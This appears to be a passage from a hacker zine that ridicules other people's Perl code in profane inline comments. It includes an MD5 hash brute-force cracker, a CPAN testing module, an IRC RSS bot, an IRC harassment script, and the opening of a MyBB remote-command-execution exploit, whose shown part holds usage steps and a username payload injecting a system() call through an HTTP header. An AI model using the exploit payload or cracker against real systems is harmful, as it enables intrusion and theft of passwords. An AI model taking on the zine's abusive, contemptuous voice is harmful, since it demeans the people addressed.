&#39;^&#39;,&#39;&amp;&#39;,&#39;*&#39;,&#39;(&#39;,&#39;)&#39;,&#39;_&#39;,&#39;+&#39;,&#39;{&#39;,&#39;}&#39;,&#39;|&#39;,
&#39;:&#39;,&#39;&quot;&#39;,&#39;&lt;&#39;,&#39;&gt;&#39;,);
$CharToUse = 62;
getmd5();

# lets just keep dancing sub1 -&gt; sub2 -&gt; sub3
# what lovely organization!

sub getmd5 {
print &quot;\nEnter the MD5 list name (list.txt):\n&quot;;
chomp($list = &lt;STDIN&gt;); print &quot;\n\n&quot;;
testarg();
# it would be nice if this was lexical, and your subroutines actually returned something
# as it is, why bother having these subs at all? Especially since they aren&#39;t reused? 
}

sub testarg {
open(F, $list) || die (&quot;\nCan&#39;t open list!!\n&quot;);
@md5 = &lt;F&gt;;
$length11 = @md5;
# length11? was there a length10? Perl has arrays, you know
if (!&lt;A&gt;){
open(A, &quot;&gt;&gt;MD5.txt&quot;) || die (&quot;\nCan&#39;t open file to write to!!\n&quot;);
}
makelist()
}
sub makelist {
for ($br = 1; $br &lt;= 12; $br++) {
for ($len1 = 0; $len1 &lt;= $CharToUse; $len1++) {
$word[1] = $char[$len1];
if ($br &lt;= 1) {
  AddToList(@word);
 }
else {
for ($len2 = 0; $len2 &lt;= $CharToUse; $len2++) {
 $word[2] = $char[$len2];
 if ($br &lt;= 2) {
  AddToList(@word);
 }
else {
for ($len3 = 0; $len3 &lt;= $CharToUse; $len3++) {
$word[3] = $char[$len3];
if ($br &lt;= 3) {
AddToList(@word);
}
else {
for ($len4 = 0; $len4 &lt;= $CharToUse; $len4++) {
$word[4] = $char[$len4];
if ($br &lt;= 4) {
AddToList(@word);
}
else {
for ($len5 = 0; $len5 &lt;= $CharToUse; $len5++) {
$word[5] = $char[$len5];
if ($br &lt;= 5) {
AddToList(@word);
}
else {
for ($len6 = 0; $len6 &lt;= $CharToUse; $len6++) {
$word[6] = $char[$len6];
if ($br &lt;= 6) {
AddToList(@word);
}
else {
for ($len7 = 0; $len7 &lt;= $CharToUse; $len7++) {
$word[7] = $char[$len7];
if ($br &lt;= 7) {
AddToList(@word);
}
else {
for ($len8 = 0; $len8 &lt;= $CharToUse; $len8++) {
$word[8] = $char[$len8];
if ($br &lt;= 8) {
AddToList(@word);
}
else {
for ($len9 = 0; $len9 &lt;= $CharToUse; $len9++) {
$word[9] = $char[$len9];
if ($br &lt;= 9) {
AddToList(@word);
}
else {
for ($len10 = 0; $len10 &lt;= $CharToUse; $len10++) {
$word[10] = $char[$len10];
if ($br &lt;= 10) {
AddToList(@word);
}
else {
for ($len11 = 0; $len11 &lt;= $CharToUse; $len11++) {
$word[11] = $char[$len11];
if ($br &lt;= 11) {
AddToList(@word);
}
else {
for ($len12 = 0; $len12 &lt;= $CharToUse; $len12++) {
$word[12] = $char[$len12];
if ($br &lt;= 12) {
AddToList(@word);
}
else {
for ($len13 = 0; $len13 &lt;= $CharToUse; $len13++) {
$word[13] = $char[$len13];
if ($br &lt;= 13) {
AddToList(@word);
}
else {
for ($len14 = 0; $len14 &lt;= $CharToUse; $len14++) {
$word[14] = $char[$len14];
if ($br &lt;= 14) {
AddToList(@word);
}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}

# that was disgusting. In every way. I don&#39;t think I need to say anymore about the above.

sub AddToList {
my (@entry) = @_;
# holy fucking shit you know how to take parameters!
my ($test) = join &quot;&quot;, @entry;
my ($m) = md5_hex &quot;$test&quot;;
# you stupid quotemonkey
print (&quot;$m = $test\n&quot;);
# you stupid parenmonkey
for ($a = 0; $a &lt;= $length11; $a++)
# you stupid Cstylemonkey
{
     chomp($md5[$a]);
 if ($m eq $md5[$a]){
  print &quot;\n\n\nFound !\t[ $test ]\n\n&quot;;
  print A &quot;$m = $test\n&quot;;
  splice(@md5, $a, 1);
# wow, you know a real command.
  if (!$md5[0]) { exit(); }
 }
}
}
}

# I need some better material
# don&#39;t worry, the good stuff comes along

-[0x0A] # School You: xdg ------------------------------------------------

package Test::MockRandom;
$VERSION = &quot;0.99&quot;;
@EXPORT = qw( srand rand oneish export_rand_to export_srand_to );
@ISA = qw( Exporter );

use strict;

# Required modules
use Carp;
use Exporter;

#--------------------------------------------------------------------------#
# main pod documentation #####
#--------------------------------------------------------------------------#

=head1 NAME

Test::MockRandom -  Replaces random number generation with non-random number
generation

=head1 SYNOPSIS

  # intercept rand in another package
  use Test::MockRandom &#39;Some::Other::Package&#39;;
  use Some::Other::Package; # exports sub foo { return rand }
  srand(0.13);
  foo(); # returns 0.13
  
  # using a seed list and &quot;oneish&quot;
  srand(0.23, 0.34, oneish() );
  foo(); # returns 0.23
  foo(); # returns 0.34
  foo(); # returns a number just barely less than one
  foo(); # returns 0, as the seed array is empty
  
  # object-oriented, for use in the current package
  use Test::MockRandom ();
  my $nrng = Test::MockRandom-&gt;new(0.42, 0.23);
  $nrng-&gt;rand(); # returns 0.42
  
=head1 DESCRIPTION

This perhaps ridiculous-seeming module was created to test routines that
manipulate random numbers by providing a known output from C&lt;rand&gt;.  Given a
list of seeds with C&lt;srand&gt;, it will return each in turn.  After seeded random
numbers are exhausted, it will always return 0.  Seed numbers must be of a form
that meets the expected output from C&lt;rand&gt; as called with no arguments -- i.e.
they must be between 0 (inclusive) and 1 (exclusive).  In order to facilitate
generating and testing a nearly-one number, this module exports the function
C&lt;oneish&gt;, which returns a number just fractionally less than one.  

Depending on how this module is called with C&lt;use&gt;, it will export C&lt;rand&gt; to a
specified package (e.g. a class being tested) effectively overriding and
intercepting calls in that package to the built-in C&lt;rand&gt;.  It can also
override C&lt;rand&gt; in the current package or even globally.  In all
of these cases, it also exports C&lt;srand&gt; and C&lt;oneish&gt; to the current package
in order to control the output of C&lt;rand&gt;.  See L&lt;/USAGE&gt; for details.

Alternatively, this module can be used to generate objects, with each object
maintaining its own distinct seed array.

=head1 USAGE

By default, Test::MockRandom does not export any functions.  This still allows
object-oriented use by calling C&lt;Test::MockRandom-E&lt;gt&gt;new(@seeds)&gt;.  In order
for Test::MockRandom to be more useful, arguments must be provided during the
call to C&lt;use&gt;.

=head2 C&lt;use Test::MockRandom &#39;Target::Package&#39;&gt;

The simplest way to intercept C&lt;rand&gt; in another package is to provide the
name(s) of the package(s) for interception as arguments in the C&lt;use&gt;
statement.  This will export C&lt;rand&gt; to the listed packages and will export
C&lt;srand&gt; and C&lt;oneish&gt; to the current package to control the behavior of
C&lt;rand&gt;.  You B&lt;must&gt; C&lt;use&gt; Test::MockRandom before you C&lt;use&gt; the target
package.  This is a typical case for testing a module that uses random numbers:

 use Test::More &#39;no_plan&#39;;
 use Test::MockRandom &#39;Some::Package&#39;;
 BEGIN { use_ok( Some::Package ) }
 
 # assume sub foo { return rand } was imported from Some::Package
 
 srand(0.5)
 is( foo(), 0.5, &quot;is foo() 0.5?&quot;) # test gives &quot;ok&quot;

If multiple package names are specified, C&lt;rand&gt; will be exported to all
of them.

If you wish to export C&lt;rand&gt; to the current package, simply provide
C&lt;__PACKAGE__&gt; as the parameter for C&lt;use&gt;, or C&lt;main&gt; if importing
to a script without a specified package.  This can be part of a
list provided to C&lt;use&gt;.  All of the following idioms work:

 use Test::MockRandom qw( main Some::Package ); # Assumes a script
 use Test::MockRandom __PACKAGE__, &#39;Some::Package&#39;;

 # The following doesn&#39;t interpolate __PACKAGE__ as above, but 
 # Test::MockRandom will still DWIM and handle it correctly

 use Test::MockRandom qw( __PACKAGE__ Some::Package );

=head2 C&lt;use Test::MockRandom { %customized }&gt;

As an alternative to a package name as an argument to C&lt;use&gt;,
Test::MockRandom will also accept a hash reference with a custom
set of instructions for how to export functions:

 use Test::MockRandom {
    rand   =&gt; [ Some::Package, {Another::Package =&gt; &#39;random&#39;} ],
    srand  =&gt; { Another::Package =&gt; &#39;seed&#39; }, 
    oneish =&gt; __PACKAGE__
 };

The keys of the hash may be any of C&lt;rand&gt;, C&lt;srand&gt;, and C&lt;oneish&gt;.  The
values of the hash give instructions for where to export the symbol
corresponding to the key.  These are interpreted as follows, depending on their
type:

=over

=item *

String: a package to which Test::MockRandom will export the symbol

=item *

Hash Reference: the key is the package to which Test::MockRandom will export
the symbol and the value is the name under which it will be exported

=item *

Array Reference: a list of strings or hash references which will be handled
as above

=back

=head2 C&lt;Test::MockRandom-E&lt;gt&gt;export_rand_to( &#39;Target::Package&#39; =E&lt;gt&gt; &#39;rand_alias&#39; )&gt;

In order to intercept the built-in C&lt;rand&gt; in another package, 
Test::MockRandom must export its own C&lt;rand&gt; function to the 
target package B&lt;before&gt; the target package is compiled, thus overriding
calls to the built-in.  The simple approach (described above) of providing the
target package name in the C&lt;use Test::MockRandom&gt; statement accomplishes this
because C&lt;use&gt; is equivalent to a C&lt;require&gt; and C&lt;import&gt; within a C&lt;BEGIN&gt;
block.  To explicitly intercept C&lt;rand&gt; in another package, you can also call
C&lt;export_rand_to&gt;, but it must be enclosed in a C&lt;BEGIN&gt; block of its own.  The
explicit form also support function aliasing just as with the custom approach
with C&lt;use&gt;, described above:

 use Test::MockRandom;
 BEGIN {Test::MockRandom-&gt;export_rand_to(&#39;AnotherPackage&#39;=&gt;&#39;random&#39;)}
 use AnotherPackage;
 
This C&lt;BEGIN&gt; block must not include a C&lt;use&gt; statement for the package to be
intercepted, or perl will compile the package to be intercepted before the
C&lt;export_rand_to&gt; function has a chance to execute and intercept calls to 
the built-in C&lt;rand&gt;.  This is very important in testing.  The C&lt;export_rand_to&gt;
call must be in a separate C&lt;BEGIN&gt; block from a C&lt;use&gt; or C&lt;use_ok&gt; test,
which should be enclosed in a C&lt;BEGIN&gt; block of its own: 
 
 use Test::More tests =&gt; 1;
 use Test::MockRandom;
 BEGIN { Test::MockRandom-&gt;export_rand_to( &#39;AnotherPackage&#39; ); }
 BEGIN { use_ok( &#39;AnotherPackage&#39; ); }

Given these cautions, it&#39;s probably best to use either the simple or custom
approach with C&lt;use&gt;, which does the right thing in most circumstances.  Should
additional explicit customization be necessary, Test::MockRandom also provides
C&lt;export_srand_to&gt; and C&lt;export_oneish_to&gt;.

=head2 Overriding C&lt;rand&gt; globally: C&lt;use Test::MockRandom &#39;CORE::GLOBAL&#39;&gt;

This is just like intercepting C&lt;rand&gt; in a package, except that you
do it globally by overriding the built-in function in C&lt;CORE::GLOBAL&gt;. 

 use Test::MockRandom &#39;CORE::GLOBAL&#39;;
 
 # or

 BEGIN { Test::MockRandom-&gt;export_rand_to(&#39;CORE::GLOBAL&#39;) }

You can always access the real, built-in C&lt;rand&gt; by calling it explicitly as
C&lt;CORE::rand&gt;.

=head2 Intercepting C&lt;rand&gt; in a package that also contains a C&lt;rand&gt; function

This is tricky as the order in which the symbol table is manipulated will lead
to very different results.  This can be done safely (maybe) if the module uses
the same rand syntax/prototype as the system call but offers them up as method
calls which resolve at run-time instead of compile time.  In this case, you
will need to do an explicit intercept (as above) but do it B&lt;after&gt; importing
the package.  I.e.:

 use Test::MockRandom &#39;SomeRandPackage&#39;;
 use SomeRandPackage;
 BEGIN { Test::MockRandom-&gt;export_rand_to(&#39;SomeRandPackage&#39;);

The first line is necessary to get C&lt;srand&gt; and C&lt;oneish&gt; exported to
the current package.  The second line will define a C&lt;sub rand&gt; in 
C&lt;SomeRandPackage&gt;, overriding the results of the first line.  The third
line then re-overrides the C&lt;rand&gt;.  You may see warnings about C&lt;rand&gt; 
being redefined.

Depending on how your C&lt;rand&gt; is written and used, there is a good likelihood
that this isn&#39;t going to do what you&#39;re expecting, no matter what.  If your
package that defines C&lt;rand&gt; relies internally upon the system
C&lt;CORE::GLOBAL::rand&gt; function, then you may be best off overriding that
instead.

=head1 FUNCTIONS

=cut

#--------------------------------------------------------------------------#
# Class data
#--------------------------------------------------------------------------#

my @data = (0);

#--------------------------------------------------------------------------#
# new()
#--------------------------------------------------------------------------#

=head2 C&lt;new&gt;

 $obj = new( LIST OF SEEDS );

Returns a new Test::MockRandom object with the specified list of seeds.

=cut

sub new {
    my ($class, @data) = @_;
    my $self = bless ([], ref ($class) || $class);
    $self-&gt;srand(@data);
    return $self;
}

#--------------------------------------------------------------------------#
# srand()
#--------------------------------------------------------------------------#

=head2 C&lt;srand&gt;

 srand( LIST OF SEEDS );
 $obj-&gt;srand( LIST OF SEEDS);

If called as a bare function call or package method, sets the seed list
for bare/package calls to C&lt;rand&gt;.  If called as an object method,
sets the seed list for that object only.

=cut

sub srand {
    if (ref ($_[0]) eq __PACKAGE__) {
        my $self = shift;
        @$self = $self-&gt;_test_srand(@_);
        return;
    } else {
        @data = Test::MockRandom-&gt;_test_srand(@_);
        return;
    }
}

sub _test_srand {
    my ($self, @data) = @_;
    my $error = &quot;Seeds for &quot; . __PACKAGE__ . 
                &quot; must be between 0 (inclusive) and 1 (exclusive)&quot;;
    croak $error if grep { $_ &lt; 0 or $_ &gt;= 1 } @data;    
    return @data ? @data : ( 0 );
}

#--------------------------------------------------------------------------#
# rand()
#--------------------------------------------------------------------------#

=head2 C&lt;rand&gt;

 $rv = rand();
 $rv = $obj-&gt;rand();
 $rv = rand(3);

If called as a bare or package function, returns the next value from the
package seed list.  If called as an object method, returns the next value from
the object seed list. 

If C&lt;rand&gt; is called with a numeric argument, it follows the same behavior as
the built-in function -- it multiplies the argument with the next value from
the seed array (resulting in a random fractional value between 0 and the
argument, just like the built-in).  If the argument is 0, undef, or
non-numeric, it is treated as if the argument is 1.

Using this with an argument in testing may be complicated, as limits in
floating point precision mean that direct numeric comparisons are not reliable.
E.g.

 srand(1/3);
 rand(3);       # does this return 1.0 or .999999999 etc.

=cut

sub rand {
    my ($mult,$val);
    if (ref ($_[0]) eq __PACKAGE__) { # we&#39;re a MockRandom object
        $mult = $_[1];
        $val = shift @{$_[0]} || 0;
    } else {
        # we might be called as a method of some other class
        # so we need to ignore that and get the right multiplier
        $mult = $_[ ref($_[0]) ? 1 : 0];
        $val =  shift @data || 0;
    }
    # default to 1 for undef, 0, or strings that aren&#39;t numbers
    eval { local $^W = 0; my $bogus = 1/$mult };
    $mult = 1 if $@;    
    return $val * $mult;
}

#--------------------------------------------------------------------------#
# oneish()
#--------------------------------------------------------------------------#

=head2 C&lt;oneish&gt;

 srand( oneish() );
 if ( rand() == oneish() ) { print &quot;It&#39;s almost one.&quot; };

A utility function to return a nearly-one value.  Equal to ( 2^32 - 1 ) / 2^32.
Useful in C&lt;srand&gt; and test functions.

=cut

sub oneish {
    return (2**32-1)/(2**32);	
}

#--------------------------------------------------------------------------#
# export_rand_to()
#--------------------------------------------------------------------------#

=head2 C&lt;export_rand_to&gt;

 Test::MockRandom-&gt;export_rand_to( &#39;Some::Class&#39; );
 Test::MockRandom-&gt;export_rand_to( &#39;Some::Class&#39; =&gt; &#39;random&#39; );

This function exports C&lt;rand&gt; into the specified package namespace.  It must be
called as a class function.  If a second argument is provided, it is taken as
the symbol name used in the other package as the alias to C&lt;rand&gt;:
 
 use Test::MockRandom;
 BEGIN { Test::MockRandom-&gt;export_rand_to( &#39;Some::Class&#39; =&gt; &#39;random&#39; ); }
 use Some::Class;
 srand (0.5);
 print Some::Class::random(); # prints 0.5

It can also be used to explicitly intercept C&lt;rand&gt; after Test::MockRandom has
been loaded.  The effect of this function is highly dependent on when it is
called in the compile cycle and should usually called from within a BEGIN
block.  See L&lt;/USAGE&gt; for details.

Most users will not need this function.

=cut

sub export_rand_to {
    _export_fcn_to(shift, &quot;rand&quot;, @_);
}

#--------------------------------------------------------------------------#
# export_srand_to()
#--------------------------------------------------------------------------#

=head2 C&lt;export_srand_to&gt;

 Test::MockRandom-&gt;export_srand_to( &#39;Some::Class&#39; );
 Test::MockRandom-&gt;export_srand_to( &#39;Some::Class&#39; =&gt; &#39;seed&#39; );

This function exports C&lt;srand&gt; into the specified package namespace.  It must be 
called as a class function.  If a second argument is provided, it is taken as
the symbol name to use in the other package as the alias for C&lt;srand&gt;.
This function may be useful if another package wraps C&lt;srand&gt;:
 
 # In Some/Class.pm
 package Some::Class;
 sub seed { srand(shift) }
 sub foo  { rand }

 # In a script
 use Test::MockRandom &#39;Some::Class&#39;;
 BEGIN { Test::MockRandom-&gt;export_srand_to( &#39;Some::Class&#39; ); }
 use Some::Class;
 seed(0.5);
 print foo();   # prints &quot;0.5&quot;

The effect of this function is highly dependent on when it is called in the
compile cycle and should usually be called from within a BEGIN block.  See
L&lt;/USAGE&gt; for details.

Most users will not need this function.  

=cut

sub export_srand_to {
    _export_fcn_to(shift, &quot;srand&quot;, @_);
}


#--------------------------------------------------------------------------#
# export_oneish_to()
#--------------------------------------------------------------------------#

=head2 C&lt;export_oneish_to&gt;

 Test::MockRandom-&gt;export_oneish_to( &#39;Some::Class&#39; );
 Test::MockRandom-&gt;export_oneish_to( &#39;Some::Class&#39; =&gt; &#39;nearly_one&#39; );

This function exports C&lt;oneish&gt; into the specified package namespace.  It must
be called as a class function.  If a second argument is provided, it is taken
as the symbol name to use in the other package as the alias for C&lt;oneish&gt;.  
Since C&lt;oneish&gt; is usually only used in a test script, this function is likely
only necessary to alias C&lt;oneish&gt; to some other name in the current package:

 use Test::MockRandom &#39;Some::Class&#39;;
 BEGIN { Test::MockRandom-&gt;export_oneish_to( __PACKAGE__, &quot;one&quot; ); }
 use Some::Class;
 seed( one() );
 print foo();   # prints a value very close to one

The effect of this function is highly dependent on when it is called in the
compile cycle and should usually be called from within a BEGIN block.  See
L&lt;/USAGE&gt; for details.

Most users will not need this function.  

=cut

sub export_oneish_to {
    _export_fcn_to(shift, &quot;oneish&quot;, @_);
}

#--------------------------------------------------------------------------#
# _export_fcn_to
#--------------------------------------------------------------------------#

sub _export_fcn_to {
    my ($self, $fcn, $pkg, $alias) = @_;
    croak &quot;Must call to export_${fcn}_to() as a class method&quot;
        unless ( $self eq __PACKAGE__ );
    croak(&quot;export_${fcn}_to() requires a package name&quot;) unless $pkg;
    _export_symbol($fcn,$pkg,$alias);
}

#--------------------------------------------------------------------------#
# _export_symbol()
#--------------------------------------------------------------------------#

sub _export_symbol {
    my ($sym,$pkg,$alias) = @_;
    $alias ||= $sym;
    {
        no strict &#39;refs&#39;;
        local $^W = 0; # no redefine warnings
        *{&quot;${pkg}::${alias}&quot;} = \&amp;{&quot;Test::MockRandom::${sym}&quot;};
    }
}

#--------------------------------------------------------------------------#
# _custom_export
#--------------------------------------------------------------------------#

sub _custom_export {
    my ($sym,$custom) = @_;
    if ( ref($custom) eq &#39;HASH&#39; ) {
        _export_symbol( $sym, %$custom ); # flatten { pkg =&gt; &#39;alias&#39; }
    }
    else {
        _export_symbol( $sym, $custom );
    }
}

#--------------------------------------------------------------------------#
# import()
#--------------------------------------------------------------------------#

sub import {
    my $class = shift;
    my $caller = caller(0);
    
    # Nothing exported by default or if empty string
    return unless @_;
    return if ( @_ == 1 &amp;&amp; $_[0] eq &#39;&#39; );

    for my $tgt ( @_ ) {
        # custom handling if it&#39;s a hashref
        if ( ref($tgt) eq &quot;HASH&quot; ) {
            for my $sym ( keys %$tgt ) {
                croak &quot;Unrecognized symbol &#39;$sym&#39;&quot; 
                    unless grep { $sym eq $_ } qw (rand srand oneish);
                my @custom = ref($tgt-&gt;{$sym}) eq &#39;ARRAY&#39; ? 
                @{$tgt-&gt;{$sym}} : $tgt-&gt;{$sym};
                _custom_export( $sym, $_ ) for ( @custom );
            }
        }
        # otherwise, export rand to target and srand/oneish to caller
        else {
            my $pkg = ($tgt =~ /^__PACKAGE__$/) ? $caller : $tgt; # DWIM
            _export_symbol(&quot;rand&quot;,$pkg);
            _export_symbol($_,$caller) for qw( srand oneish );
        }
    }
}

1; #this line is important and will help the module return a true value
__END__

=head1 BUGS

Please report bugs using the CPAN Request Tracker at 

http://rt.cpan.org/NoAuth/Bugs.html?Dist=Test-MockRandom

=head1 AUTHOR

David A Golden &lt;dagolden@cpan.org&gt;
 
http://dagolden.com/

=head1 COPYRIGHT

Copyright (c) 2004-2005 by David A. Golden

This program is free software; you can redistribute
it and/or modify it under the same terms as Perl itself.

The full text of the license can be found in the
LICENSE file included with this module.


=head1 SEE ALSO

=over

=item L&lt;Test::MockObject&gt;

=item L&lt;Test::MockModule&gt;

=back

=cut

-[0x0B] # Token PHP Noob -------------------------------------------------

use strict;
# you can&#39;t handle your strict
# go back to the documentation

##Configuration settings

use vars qw ($nick $server $port $channel $rss_url $refresh);
# way to avoid strict, moron 

$nick = &#39;RSSBot&#39;;
$server = &#39;irc.jamscone.com&#39;;
$port = 6667;
$channel = &#39;#jamscone&#39;;
$rss_url = &#39;http://www.codingo.net/blog/feed/&#39;;
$refresh = 30*60;

## Premable

# what the fuck is premable? 
# are you dyslexic, skelm?
# must be why you stick to php, easy to spell that

use POSIX;
use Net::IRC;
use LWP::UserAgent;
use XML::RSS;
# keep this at the top

## Connection initialization
use vars qw ($irc $conn);
# this better not be persistent

$irc = new Net::IRC;
print &quot;Connecting to server &quot;.$server.&quot;:&quot;.$port.&quot; with nick &quot;.$nick.&quot;...\n&quot;;
# quote it all and keep it simple

$conn = $irc-&gt;newconn (Nick =&gt; $nick, Server =&gt; $server, Port =&gt; $port, Ircname =&gt; &#39;RSS-&gt;IRC Gateway IRC hack&#39;);
# thank you, thank you for not quoting
# please tell me that you didn&#39;t just steal that line from Net::IRC docs

# Connect event handler - we immediately try to join our channel
sub on_connect {
	my ($self, $event) = @_;
	print &quot;Joining channel &quot;.$channel.&quot;...\n&quot;;
	$self-&gt;join ($channel);
# this is stolen too, are your comments even your own?
}

$conn-&gt;add_handler (&#39;endofnames&#39;, \&amp;on_joined);

# Custom CTCP version request
sub on_cversion {
	my ($self, $event) = @_;
	$self-&gt;ctcp_reply ($event-&gt;nick, &#39;VERSION RSS-&gt;RSS Notify&#39;);
}

$conn-&gt;add_handler(&#39;cversion&#39;, \&amp;on_cversion);

## The RSS Feed
use vars qw  (@items);

# Fetches the RSS from server and returns a list of items
sub fetch_rss {
	my $ua = LWP::UserAgent-&gt;new (env_proxy =&gt; 1, keep_alive =&gt; 1, timeout =&gt; 30);
	my $request = HTTP::Request-&gt;new(&#39;GET&#39;, $rss_url);
	my $response = $ua-&gt;request ($request);
	return unless ($response-&gt;is_success);
# you could just use LWP::Simple::get()
	my $data = $response-&gt;content;
	my $rss = new XML::RSS ();
	$rss-&gt;parse($data);
	foreach my $item (@{$rss-&gt;{items}}) {
	# I personally guarantee you didn&#39;t write that yourself
		# Make sure to strip any possible newlines and similar stuff
		$item-&gt;{title} =~ s/\s/ /g;
	}
	
	return @{$rss-&gt;{items}};
}

# Attempts to find some newly appeared RSS Items
sub delta_rss {
	my ($old, $new) = @_;
	
	# If @$old is empty, it means this is the first run and we will therefore not do anything
	
	return () unless ($old and @$old);
# return () unless @$old;
	# We take the first item of @$old and find it in @$new. 
	# Then anything before its position in @$new are the newly appeared items which we return.
	
	my $sync = $old-&gt;[0];
	
	# If it is at the start of @$new, nothing has changed
	
	return () if ($sync-&gt;{title} eq $new-&gt;[0]-&gt;{title});
	
	my $item;
	for ($item = 1; $item &lt; @$new; $item++) {
	# for my $item (1 .. @$new) { # at least!
		# We are comparing the title whcih might not be 100% reliable but 
		# RSS streams really should not contain multiple items with the same title
		
		last if ($sync-&gt;{title} eq $new-&gt;[$item]-&gt;{title});
	}
	
	return @$new[0 .. $item - 1];
	# you do know ..
	# ignorance was never an excuse!
}

# Check RSS feed periodically.
sub check_rss {
	my (@new_items);
	# why? why?
	print &quot;Checking RSS feed [&quot;.$rss_url.&quot;]...\n&quot;; # could just keep $rss_url in the quotes
	@new_items = fetch_rss ();
	if (@new_items) {
		my @delta = delta_rss (\@items, \@new_items);
		foreach my $item (reverse @delta) {
			$conn -&gt;privmsg ($channel, &#39;&quot;&#39;.$item-&gt;{title}.&#39;&quot; :: &#39;.$item-&gt;{link});
		}
		@item = @new_items;
	}
alarm $refresh;
}

$SIG{ALRM} = \&amp;check_rss;
# three cheers for signals
check_rss();

# Fire up the IRC loop
$irc-&gt;start;
# yes, let&#39;s get this party started

-[0x0C] # Hello bantown --------------------------------------------------

What&#39;s nice about bantown is that they are relatively competent. They get shit done. 
They aren&#39;t all talk. Despite the repulsive exterior, these guys do shit. What 
particularly attaches our sympathies to them is that they use quality Perl scripts 
and give credit to them. This script isn&#39;t perfect, but its pretty nice, and of course 
gets the job done. It&#39;s very tempting to criticize this code, but I will refrain 
because this is the worst of the scripts they advertise, but the smallest to include. 
Here&#39;s to bantown and classy idiocy!

#
# aol.pl adapted from aol.scr
#
# author: cj_ &lt;rover@gruntle.org&gt;
# 
#/aolsay         [to send a random aolsay to the channel
#/colaolsay	 [colorize above]
#/aolmsg &lt;nick&gt;  [to send a random aolmsg to &lt;nick&gt;
#/aoltopic       [to set a random aoltopic on the channel
#/aolkick &lt;nick&gt; [to kick an aol lamer with a random aolkick msg
#

use Irssi;
use Irssi::Irc;
use strict;

our $VERSION = &quot;0.02&quot;;

###############################
# these are the main commands #
###############################

sub aolsay { _aolsay(&quot;&quot;, @_) }
sub colaolsay { _aolsay(&quot;r&quot;, @_) }
sub aolkick { _aolkick(&quot;&quot;, @_) }
sub colaolkick { _aolkick(&quot;r&quot;, @_) }

sub _aolsay {
	my ($flags, $text, $server, $dest) = @_;

	if (!$server || !$server-&gt;{connected}) {
		Irssi::print(&quot;Not connected to server&quot;);
		return;
	}

	return unless $dest;

	my $phrases = phrases();
	my $resp = $$phrases[int(rand(0) * scalar(@$phrases))];

	$resp = rainbow($resp) if $flags =~ /r/i;

	foreach my $line (split(/\n/, $resp)) {
		if ($dest-&gt;{type} eq &quot;CHANNEL&quot; || $dest-&gt;{type} eq &quot;QUERY&quot;) {
			$dest-&gt;command(&quot;/msg &quot; . $dest-&gt;{name} . &quot; &quot; . $line);
		}
	}
}

sub _aolkick {
	my ($flags, $text, $server, $dest) = @_;

	if (!$server || !$server-&gt;{connected}) {
		Irssi::print(&quot;Not connected to server&quot;);
		return;
	}

	return unless $dest;

	my $phrases = phrases();
	my $resp = $$phrases[int(rand(0) * scalar(@$phrases))];

	$resp = rainbow($resp) if $flags =~ /r/i;

	$dest-&gt;command(&quot;KICK $text $resp&quot;);
}

sub rainbow {
	# take text and make it colorful
	my $text = shift;
	my $row = 0;
	my @colormap = _colormap();
	my $newtext;

	foreach my $line (split(/\n/, $text)) {
		for (my $i = 0; $i &lt; length($line); $i++) {
			my $chr = substr($line, $i, 1);
			my $color = $i + $row;
			$color = $color ?  $colormap[$color %($#colormap-1)] : $colormap[0];
			$newtext .= &quot;\003$color&quot; unless ($chr =~ /\s/);
			my $ord = ord($chr);
			if (($ord &gt;= 48 and $ord &lt;= 57) or $ord == 44) {
				$newtext .= &quot;\26\26&quot;;
			}
			$newtext .= $chr;
		}
		$newtext .= &quot;\n&quot;;
		$row++;
	}

	return $newtext;
}

sub _colormap {
	# just data for the rainbow routine
	my @colormap = (
		4,4,
		7,7,
		5,5,
		8,8,
		9,9,
		3,3,
		10,10,
		11,11,
		12,12,
		2,2,
		6,6,
		13,13,
	);

	return @colormap;
}


# command bindings
Irssi::command_bind(&quot;aolsay&quot;, \&amp;aolsay);
Irssi::command_bind(&quot;colaolsay&quot;, \&amp;colaolsay);
#Irssi::command_bind(&quot;aolmsg&quot;, \&amp;aolmsg);
#Irssi::command_bind(&quot;aoltopic&quot;, \&amp;aoltopic);
Irssi::command_bind(&quot;aolkick&quot;, \&amp;aolkick);
Irssi::command_bind(&quot;colaolkick&quot;, \&amp;colaolkick);

sub phrases {
	my @phrases = (
		&#39;ALL OREAND THE GIFCHERRY BUSH DA BOON CHASED DA WHEASELGIFPASTECLITNUGGET SHIT]&#39;,
		&#39;PHRASES CUT OUT DUE TO LACK OF RELEVANCE&#39;,
		&#39;KEWLI0, EYEV BIN WAITNIG FER J00, WHERE ARE DOZE KIDDIESEXGIFOGRAFZ DAT J00 SAID J00D GIB MEE???/?&#39;,
	);

	return \@phrases;
}

-[0x0D] # !dSR !good -----------------------------------------------------

We avoid attacking the same targets. HOWEVER, this is fresh code, and it still isn&#39;t good, so you deserve it.

#!/usr/bin/perl 
# Tue Jun 13 12:37:12 CEST 2006 jolascoaga@514.es
#
# Exploit HOWTO - read this before flood my Inbox you bitch!
#
# - First you need to create the special user to do this use:
#	./mybibi.pl --host=http://www.example.com --dir=/mybb -1
#   this step needs a graphic confirmation so the exploit writes a file 
#   in /tmp/file.png, you need to
#   see this img and put the text into the prompt. If everything is ok, 
#   you&#39;ll have a new valid user created.
# * There is a file mybibi_out.html where the exploit writes the output 
#   for debugging.
# - After you have created the exploit or if you have a valid non common 
#   user, you can execute shell commands.
#
# TIPS:
# 	* Sometimes you have to change the thread Id, --tid is your friend ;)
#	* Don&#39;t forget to change the email. You MUST activate the account.
#	* Mejor karate aun dentro ti.
#
# LIMITATIONS:
#	* If the admin have the username lenght &lt; 28 this exploit doesn&#39;t works
#
# Greetz to !dSR ppl and unsec
#
# 514 still r0xing!

# learn how to use POD, asshole

# user config.
my $uservar = &quot;C&quot;; # don&#39;t use large vars.
my $password = &quot;514r0x&quot;;
my $email = &quot;514\@mailinator.com&quot;;
# I wonder how many days you spent figuring out how to escape the @ ;]

use LWP::UserAgent;
use HTTP::Cookies;
use LWP::Simple;
use HTTP::Request::Common &quot;POST&quot;;
use HTTP::Response;
use Getopt::Long;
use strict;

$| = 1;   # you can choose this or another one.
# the other one being...0? You realize this variable only holds those two values, right?

# Sweet, all randomly ordered in no way consistent with how they&#39;re used!

my ($proxy,$proxy_user,$proxy_pass, $username);
my ($host,$debug,$dir, $command, $del, $first_time, $tid);
my ($logged, $tid) = (0, 2);

$username = &quot;&#39;.system(getenv(HTTP_&quot;.$uservar.&quot;)).&#39;&quot;;

my $options = GetOptions (
  &#39;host=s&#39;	      =&gt; \$host, 
  &#39;dir=s&#39;	      =&gt; \$dir,
